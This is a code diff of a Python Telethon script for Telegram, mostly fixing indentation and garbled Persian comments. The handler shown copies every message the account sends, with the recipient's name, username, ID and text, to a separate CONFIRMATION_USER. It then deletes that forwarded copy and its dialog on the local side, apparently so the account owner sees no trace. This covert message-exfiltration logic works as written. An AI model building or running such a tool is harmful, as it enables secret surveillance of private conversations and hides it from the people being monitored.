@@ -137,43 +137,44 @@ async def watch_sent_messages(event):
             else "ندارد"
         )
 
-
         message_text = (
             event.raw_text
             or "[پیام بدون متن]"
         )
 
         info = (
-    "📨 پیام جدید ارسال شد\n\n"
-    f"👤 گیرنده: {full_name}\n"
-    f"🔹 Username: {username_text}\n"
-    f"🆔 ID: {user_id}\n\n"
-    "💬 پیام:\n"
-    f"{message_text}"
-)
+            "📨 پیام جدید ارسال شد\n\n"
+            f"👤 گیرنده: {full_name}\n"
+            f"🔹 Username: {username_text}\n"
+            f"🆔 ID: {user_id}\n\n"
+            "💬 پیام:\n"
+            f"{message_text}"
+        )
 
-        sent = await client.send_message(
-    CONFIRMATION_USER,
-    info
-)
-:try
-await client.delete_messages(
-    entity=CONFIRMATION_USER,
-    message_ids=sent.id,
-    revoke=False
-)
+        try:
+            sent = await client.send_message(
+                CONFIRMATION_USER,
+                info
+            )
 
-await client.delete_dialog(CONFIRMATION_USER)
+            await client.delete_messages(
+                entity=CONFIRMATION_USER,
+                message_ids=sent.id,
+                revoke=False
+            )
 
-except Exception as e:
-    print(f"Error: {e}")
+            await client.delete_dialog(CONFIRMATION_USER)
+
+        except Exception as e:
+            print(f"Error: {e}")
+
         print(
             f"[INFO SENT] "
             f"{full_name} | message_id={event.id}"
         )
 
-        # ظ¾غŒط§ظ… ط§طµظ„غŒ ط¯ط³طھâ€Œظ†ط®ظˆط±ط¯ظ‡ ط¨ط§ظ‚غŒ ظ…غŒâ€Œظ…ط§ظ†ط¯.
-        # ظ‡غŒع† delete_messages ط¯ط± ط§غŒظ†ط¬ط§ ظˆط¬ظˆط¯ ظ†ط¯ط§ط±ط¯.
+        # پیام اصلی دست‌نخورده باقی می‌ماند.
+        # هیچ delete_messages برای پیام اصلی وجود ندارد.
 
     except FloodWaitError as e:
         print(
@@ -197,7 +198,7 @@ async def main():
     print(f"Logged in as: {me.first_name}")
     print("================================")
 
-    # ظ¾ط§ع©â€Œط³ط§ط²غŒ ط§ظˆظ„غŒظ‡
+    # پاک‌سازی اولیه
     await cleanup_dialogs()
 
     print("\nWaiting for new messages...")
